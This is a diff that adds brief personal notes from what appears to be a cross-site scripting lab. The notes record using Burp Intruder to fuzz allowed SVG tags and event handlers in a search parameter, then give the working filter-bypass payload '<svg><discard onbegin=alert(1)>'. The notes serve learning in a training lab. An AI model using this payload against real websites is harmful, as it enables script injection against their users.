@@ -1,0 +1,12 @@
+Search bar again
+Using the burp intruder to check which tags work
+discard,image,svg,title 200 status
+GET /?search=%3Csvg+§§+%3D%27alert%281%29%27%3E HTTP/1.1
+using this to check which events work
+onbegin 200 status
+going back to the cheat sheet
+using svg and onbegin
+animate works but it gets blocked 
+discard works as well
+<svg><discard onbegin=alert(1)>
+this payload solves the lab
